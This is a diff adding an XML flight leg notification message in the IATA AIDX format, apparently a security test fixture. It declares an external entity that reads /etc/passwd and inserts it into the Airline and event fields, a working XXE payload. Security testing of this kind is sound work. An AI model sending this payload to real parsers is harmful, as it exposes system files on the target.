@@ -1,0 +1,17 @@
+<?xml version="1.0"?>
+<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<IATA_AIDX_FlightLegNotifRQ>
+  <Originator CompanyShortName="LH" />
+  <FlightLeg>
+    <LegIdentifier>
+      <Airline CodeContext="3">&xxe;</Airline>
+      <FlightNumber>6202</FlightNumber>
+      <DepartureAirport CodeContext="3">HOM</DepartureAirport>
+      <ArrivalAirport CodeContext="3">LIN</ArrivalAirport>
+      <OriginDate>2026-10-14</OriginDate>
+    </LegIdentifier>
+    </FlightLeg>
+    <event>&xxe;</event>
+</IATA_AIDX_FlightLegNotifRQ>
